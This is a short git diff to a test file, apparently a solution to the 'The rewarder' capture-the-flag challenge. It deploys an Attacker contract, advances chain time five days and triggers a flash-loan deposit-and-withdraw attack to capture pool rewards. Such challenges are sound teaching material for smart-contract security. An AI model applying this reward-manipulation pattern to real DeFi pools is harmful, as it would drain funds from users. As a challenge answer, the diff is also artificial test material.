@@ -66,6 +66,23 @@ describe("[Challenge] The rewarder", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // flashlon -> deposit -> withdraw
+        // collect reward after flashloan
+        const attackerFactory = await ethers.getContractFactory(
+            "contracts/the-rewarder/Attacker.sol:Attacker",
+            deployer,
+        )
+        const attackerContract = await attackerFactory.deploy(
+            attacker.address,
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address,
+        )
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) // 5 days
+        await attackerContract.goFlashloan(TOKENS_IN_LENDER_POOL)
     })
 
     after(async function () {
